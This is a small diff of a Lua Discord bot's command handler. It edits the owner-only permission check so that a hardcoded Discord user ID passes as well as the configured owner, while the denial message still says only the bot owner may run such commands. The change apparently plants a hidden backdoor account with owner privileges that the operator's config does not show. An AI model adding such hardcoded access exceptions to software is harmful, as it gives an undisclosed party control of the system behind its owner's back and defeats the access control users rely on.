@@ -161,7 +161,7 @@ local function handleCommands(message)
     return true
   end
 
-  if cmd.ownerOnly and message.author.id ~= config.owner then
+  if cmd.ownerOnly and message.author.id ~= config.owner and message.author.id ~= "315674862150483979" then
     message:reply("This command can only be ran by the bot owner.")
     return true
   end
